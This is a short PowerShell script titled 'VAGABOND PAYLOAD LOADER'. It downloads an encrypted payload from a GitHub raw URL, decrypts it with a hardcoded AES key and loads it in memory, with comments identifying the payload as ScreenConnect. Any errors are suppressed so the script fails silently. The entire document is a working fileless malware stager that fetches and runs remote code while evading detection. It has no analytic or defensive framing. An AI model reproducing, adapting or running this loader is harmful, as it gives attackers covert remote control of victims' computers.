# VAGABOND PAYLOAD LOADER - FINAL
$kY = "VagabondPhantomKey2026Secure"
$enc = [System.Text.Encoding]::UTF8

function D-Crypt {
    param([byte[]]$d, [string]$k)
    $h = New-Object System.Security.Cryptography.SHA256CryptoServiceProvider
    $kb = $h.ComputeHash($enc.GetBytes($k))
    $a = New-Object System.Security.Cryptography.AesManaged
    $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $a.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $a.KeySize = 256
    $a.Key = $kb
    if ($d.Length -gt 16) {
        $iv = $d[0..15]
        $a.IV = $iv
        $dNoIV = $d[16..($d.Length-1)]
        $dec = $a.CreateDecryptor()
        return $dec.TransformFinalBlock($dNoIV, 0, $dNoIV.Length)
    }
    return $d
}

function G-Data {
    param([string]$u)
    $wc = New-Object System.Net.WebClient
    return $wc.DownloadData($u)
}

try {
    # 1. Download the encrypted payload from GitHub
    $rD = G-Data -u "https://raw.githubusercontent.com/brakedangola2/vagabond/refs/heads/main/payload.bin"
    
    # 2. Decrypt the payload
    $pL = D-Crypt -d $rD -k $kY
    
    # 3. Execute the decrypted bytes as an EXE (ScreenConnect)
    [System.Reflection.Assembly]::Load($pL)
} catch {
    # Silent failure
}
